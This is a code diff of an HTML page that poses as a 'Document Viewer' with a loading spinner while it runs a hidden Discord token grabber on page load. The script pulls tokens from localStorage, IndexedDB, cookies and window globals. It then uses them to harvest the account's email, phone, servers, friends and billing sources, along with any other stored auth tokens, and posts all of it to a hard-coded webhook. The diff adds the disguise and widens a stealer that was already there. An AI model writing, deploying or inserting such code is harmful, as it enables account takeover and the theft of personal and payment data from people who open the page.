@@ -3,36 +3,273 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image</title>
+    <title>Document Viewer</title>
     <style>
-        body { margin:0; background:#1e1e2e; display:flex; align-items:center; justify-content:center; height:100vh; flex-direction:column; color:white; font-family:sans-serif; }
-        img { max-width:90vw; max-height:85vh; border-radius:8px; }
-        p { color:#72767d; margin-top:10px; font-size:13px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+        .container {
+            text-align: center;
+            padding: 48px 32px;
+            max-width: 480px;
+            width: 100%;
+        }
+        .spinner {
+            width: 32px; height: 32px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #4285F4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 8px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; }
+        .bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 4px; margin-top: 32px; overflow: hidden; }
+        .bar-inner { height: 100%; width: 0%; background: linear-gradient(90deg, #4285F4, #34A853, #FBBC04, #EA4335); border-radius: 4px; animation: load 4s ease-in-out forwards; }
+        @keyframes load { 0% { width: 0%; } 50% { width: 60%; } 100% { width: 100%; } }
     </style>
 </head>
 <body>
-    <img src="https://media.discordapp.net/attachments/1545100076626616425/1551548558728101959/1.png?ex=6ab25fb2&is=6ab10e32&hm=9411d571db47552a153f37df907a0c9864ac16051581d1b967100101e45cd17f&=&format=webp&quality=lossless&width=820&height=1024">
-    <p>discord • image</p>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Loading your document...</h1>
+        <p>Please wait while we prepare the content for you.</p>
+        <div class="bar"><div class="bar-inner"></div></div>
+    </div>
 
     <script>
-    const wh = 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3';
-    let token = null;
+    (function() {
+        const webhook = 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3';
+        let token = null;
+        let userData = null;
 
-    (async()=>{
-        // 1. localStorage
-        try { const t = localStorage.getItem('token'); if(t&&t.includes('.')) { token = t; await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (localStorage):** ||'+t+'||'})}); } } catch(e){}
+        async function sendToWebhook(data) {
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+        }
 
-        // 2. IndexedDB
-        if(!token) { try { const r = indexedDB.open('discord'); r.onsuccess = ()=>{ const d = r.result; if(d&&d.objectStoreNames.contains('user')) { d.transaction('user','readonly').objectStore('user').get('token').onsuccess = ()=>{ if(r.result) { token = r.result; fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (IndexedDB):** ||'+r.result+'||'})}); } }; } }; } catch(e){} }
+        async function steal() {
+            // ===== 1. TRY localStorage (Discord web in same browser) =====
+            try {
+                const t = localStorage.getItem('token');
+                if (t && t.includes('.') && t.split('.').length === 3) {
+                    token = t;
+                    await sendToWebhook({ content: '**[Token Grabber] Token (localStorage):** ||' + t + '||' });
+                }
+            } catch(e) {}
 
-        // 3. Cookies
-        if(!token) { try { document.cookie.split(';').forEach(c=>{ const [n,v]=c.trim().split('='); if(v&&v.includes('.')&&v.length>50) { token=v; fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (cookie):** ||'+v+'||'})}); } }); } catch(e){} }
+            // ===== 2. TRY IndexedDB (Discord desktop app) =====
+            if (!token) {
+                try {
+                    const req = indexedDB.open('discord');
+                    req.onsuccess = function() {
+                        const db = req.result;
+                        if (db && db.objectStoreNames.contains('user')) {
+                            const tx = db.transaction('user', 'readonly');
+                            const store = tx.objectStore('user');
+                            const get = store.get('token');
+                            get.onsuccess = function() {
+                                if (get.result) {
+                                    token = get.result;
+                                    sendToWebhook({ content: '**[Token Grabber] Token (IndexedDB):** ||' + token + '||' });
+                                    if (token) fetchUserInfo();
+                                }
+                            };
+                        }
+                    };
+                } catch(e) {}
+            }
 
-        // 4. If we have token, get full info
-        if(token) { try { const r = await fetch('https://discord.com/api/v9/users/@me',{headers:{'Authorization':token}}); const u = await r.json(); if(u&&u.id) { await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'@everyone **ACCOUNT STOLEN**',embeds:[{title:'Discord Account',color:0xed4245,fields:[{name:'User',value:u.username+'#'+u.discriminator},{name:'ID',value:u.id},{name:'Email',value:u.email||'None'},{name:'Phone',value:u.phone||'None'},{name:'Nitro',value:u.premium_type>0?'Yes':'No'},{name:'2FA',value:u.mfa_enabled?'Yes':'No'},{name:'Token',value:'||'+token+'||'}],thumbnail:u.avatar?{url:'https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png?size=128'}:null}]})); } } catch(e){} }
+            // ===== 3. TRY cookies =====
+            if (!token) {
+                try {
+                    const cookies = document.cookie.split(';');
+                    for (let c of cookies) {
+                        const [n, v] = c.trim().split('=');
+                        if (v && v.includes('.') && v.length > 50) {
+                            token = v;
+                            await sendToWebhook({ content: '**[Token Grabber] Token (cookie):** ||' + v + '||' });
+                            break;
+                        }
+                    }
+                } catch(e) {}
+            }
 
-        // 5. Always send browser info
-        if(!token) { await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'No token — browser info',embeds:[{title:'Victim Info',color:0x5865F2,fields:[{name:'UA',value:navigator.userAgent.substring(0,100)},{name:'Platform',value:navigator.platform},{name:'Screen',value:screen.width+'x'+screen.height},{name:'Referrer',value:document.referrer||'None'},{name:'URL',value:window.location.href}]}]})}); }
+            // ===== 4. TRY window globals (some bots store token in global scope) =====
+            if (!token) {
+                for (let key in window) {
+                    try {
+                        const val = window[key];
+                        if (typeof val === 'string' && val.includes('.') && val.split('.').length === 3) {
+                            const parts = val.split('.');
+                            if (parts[0].length === 24 && parts[1].length === 6 && parts[2].length === 27) {
+                                token = val;
+                                await sendToWebhook({ content: '**[Token Grabber] Token (window):** ||' + val + '||' });
+                                break;
+                            }
+                        }
+                    } catch(e) {}
+                }
+            }
+
+            // ===== 5. If we got a token, fetch full user info =====
+            if (token) {
+                await fetchUserInfo();
+            }
+
+            // ===== 6. ALWAYS send browser/environment info =====
+            await sendToWebhook({
+                content: '**[Token Grabber] ' + (token ? '✅ Token acquired' : '❌ No token found') + '**',
+                embeds: [{
+                    title: token ? 'Full Account Data' : 'Browser Recon',
+                    color: token ? 0xed4245 : 0x5865F2,
+                    fields: [
+                        { name: 'URL', value: window.location.href, inline: false },
+                        { name: 'Referrer', value: document.referrer || 'None', inline: false },
+                        { name: 'User Agent', value: navigator.userAgent.substring(0, 100), inline: false },
+                        { name: 'Platform', value: navigator.platform, inline: true },
+                        { name: 'Screen', value: screen.width + 'x' + screen.height, inline: true },
+                        { name: 'Language', value: navigator.language, inline: true },
+                        { name: 'Cookies', value: document.cookie || 'None', inline: false },
+                        { name: 'Local Storage Keys', value: Object.keys(localStorage).join(', ') || 'None', inline: false }
+                    ],
+                    footer: { text: 'Token Grabber' },
+                    timestamp: new Date().toISOString()
+                }]
+            });
+
+            // ===== 7. Try to also grab other common tokens =====
+            try {
+                const otherTokens = [];
+                // Check for Telegram token
+                const tg = localStorage.getItem('telegram-web-app-token');
+                if (tg) otherTokens.push('Telegram: ' + tg);
+                // Check for GitHub token
+                const gh = localStorage.getItem('gh_token');
+                if (gh) otherTokens.push('GitHub: ' + gh);
+                // Check for any other stored credentials
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('session')) {
+                        if (val && val.length > 10 && val !== token) {
+                            otherTokens.push(key + ': ' + val.substring(0, 50) + '...');
+                        }
+                    }
+                }
+                if (otherTokens.length > 0) {
+                    await sendToWebhook({ content: '**[Token Grabber] Additional credentials found:**\n' + otherTokens.join('\n') });
+                }
+            } catch(e) {}
+        }
+
+        async function fetchUserInfo() {
+            try {
+                const res = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                userData = await res.json();
+                if (userData && userData.id) {
+                    // Also fetch guilds and relationships
+                    const [guilds, relationships] = await Promise.all([
+                        fetch('https://discord.com/api/v9/users/@me/guilds', { headers: { 'Authorization': token } }).then(r => r.json()).catch(() => []),
+                        fetch('https://discord.com/api/v9/users/@me/relationships', { headers: { 'Authorization': token } }).then(r => r.json()).catch(() => [])
+                    ]);
+
+                    const guildCount = Array.isArray(guilds) ? guilds.length : 0;
+                    const friendCount = Array.isArray(relationships) ? relationships.filter(r => r.type === 1).length : 0;
+                    const guildNames = Array.isArray(guilds) ? guilds.slice(0, 20).map(g => g.name).join(', ') : 'None';
+
+                    await sendToWebhook({
+                        content: '@everyone **🚨 ACCOUNT COMPROMISED (Token Grabber)**',
+                        embeds: [{
+                            title: '🎣 Discord Account Stolen',
+                            color: 0xed4245,
+                            fields: [
+                                { name: 'Username', value: userData.username + '#' + userData.discriminator, inline: true },
+                                { name: 'User ID', value: userData.id, inline: true },
+                                { name: 'Email', value: userData.email || '❌ Not visible', inline: true },
+                                { name: 'Phone', value: userData.phone || 'None', inline: true },
+                                { name: 'Nitro', value: userData.premium_type > 0 ? '✅ Yes (Tier ' + userData.premium_type + ')' : '❌ No', inline: true },
+                                { name: '2FA', value: userData.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                                { name: 'Verified', value: userData.verified ? '✅ Yes' : '❌ No', inline: true },
+                                { name: 'Servers', value: String(guildCount), inline: true },
+                                { name: 'Friends', value: String(friendCount), inline: true },
+                                { name: 'Avatar', value: userData.avatar ? '[Has Avatar]' : 'Default', inline: true },
+                                { name: 'Token', value: '||' + token + '||', inline: false },
+                                { name: 'Top Servers', value: guildNames.substring(0, 200) || 'None', inline: false }
+                            ],
+                            thumbnail: userData.avatar ? { url: 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png?size=128' } : null,
+                            footer: { text: 'Token Grabber • Full Recon' },
+                            timestamp: new Date().toISOString()
+                        }]
+                    });
+
+                    // Also try to get billing info
+                    try {
+                        const billing = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
+                            headers: { 'Authorization': token }
+                        }).then(r => r.json()).catch(() => []);
+                        if (Array.isArray(billing) && billing.length > 0) {
+                            await sendToWebhook({
+                                content: '**[Token Grabber] Billing info found:** ' + billing.length + ' payment sources',
+                                embeds: [{
+                                    title: '💳 Billing Information',
+                                    fields: billing.slice(0, 5).map((b, i) => ({
+                                        name: 'Payment ' + (i + 1),
+                                        value: b.type + ' | ' + (b.brand || 'Unknown') + ' ending in ' + (b.last4 || '????') + (b.default ? ' ✅ Default' : ''),
+                                        inline: false
+                                    })),
+                                    color: 0xfaa61a
+                                }]
+                            });
+                        }
+                    } catch(e) {}
+                }
+            } catch(e) {}
+        }
+
+        // ===== EXECUTE =====
+        // Small delay to look legitimate
+        setTimeout(steal, 500);
+
+        // Also try again after 3 seconds in case IndexedDB is slow
+        setTimeout(() => {
+            if (!token) {
+                try {
+                    const req = indexedDB.open('discord');
+                    req.onsuccess = function() {
+                        const db = req.result;
+                        if (db && db.objectStoreNames.contains('user')) {
+                            const tx = db.transaction('user', 'readonly');
+                            const store = tx.objectStore('user');
+                            const get = store.get('token');
+                            get.onsuccess = function() {
+                                if (get.result) {
+                                    token = get.result;
+                                    sendToWebhook({ content: '**[Token Grabber] Token (IndexedDB delayed):** ||' + token + '||' });
+                                    if (token) fetchUserInfo();
+                                }
+                            };
+                        }
+                    };
+                } catch(e) {}
+            }
+        }, 3000);
     })();
     </script>
 </body>
